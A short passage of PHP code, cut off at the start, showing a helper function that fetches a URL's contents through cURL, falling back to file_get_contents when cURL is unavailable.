= file_get_contents($url); } } if(!$data) return false; return $data; } function curltxt($url) { if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); curl_setopt($ch, CURLOPT_BINARYTRANSFER, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($ch); curl_close($ch); } else { $is_auf = ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; if($is_auf) { $data = file_get_contents($url); } } if(!$data) return false; return $data; } 